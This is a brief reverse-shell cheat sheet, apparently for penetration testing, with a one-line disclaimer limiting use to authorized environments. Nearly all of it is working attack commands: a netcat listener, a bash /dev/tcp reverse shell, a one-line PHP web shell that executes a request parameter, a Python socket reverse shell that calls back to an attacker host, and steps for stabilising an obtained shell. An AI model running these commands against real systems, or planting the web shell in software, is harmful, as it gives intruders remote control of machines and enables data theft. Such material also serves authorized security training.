# Reverse Shells

Use only in an authorized environment.

## Listener

```bash
nc -lvnp <LPORT>
```

## Bash

```bash
/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

## Php
```bash
<?php system($_GET['cmd']); ?>   
```
## Python

```bash
python3 -c 'import pty; import socket, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("<LHOST>", <LPORT>)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/bash")'
```

## Stabilize an existing shell
With vi (open vi)
```bash
:set shell=/bin/bash
:shell
```

With python
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export SHELL=/bin/bash
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
stty rows 38 columns 116
reset
```
Then on your local machine: Ctrl+Z → stty raw -echo → fg